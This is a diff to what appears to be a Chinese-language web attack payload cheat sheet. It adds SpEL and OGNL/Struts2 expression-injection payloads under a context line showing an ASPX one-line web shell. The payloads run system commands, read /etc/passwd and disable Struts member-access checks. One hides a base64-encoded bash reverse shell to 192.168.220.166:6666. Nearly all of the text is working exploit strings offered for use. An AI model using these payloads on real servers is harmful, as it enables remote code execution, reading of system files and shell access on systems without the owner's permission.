@@ -118,8 +118,41 @@ aspx
 
 <%@ Page Language="Jscript"%><%eval(Request.Item["xindong"],"unsafe");%>
 
+```
+
+
+
+# Spel 表达式注入
 
 ```
+/?id=${T(java.lang.Runtime).getRuntime().exec('ls -la /tmp')}
+/id=${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+/id=${T(java.lang.Runtime).getRuntime().exec('cat /tmp/1.txt')
+
+// 复杂的表达式注入
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("java.lang.Runtime.getRuntime().exec('cmd.exe /c ipconfig').getInputStream()")),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())
+
+
+```
+
+
+# Ognl 表达式注入
+```
+/?id=@java.lang.Runtime@getRuntime().exec("calc")
+(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()
+
+// 复杂的表达式注入 St2 
+/index?id=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
+
+
+%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMC4xNjYvNjY2NiAwPiYx=}|{base64,-d}|{bash,-i}'))}
+
+
+
+```
+
+
+
 
 # 多层编码 自动解码三层 WAF6.8 更新了这个功能
 ```
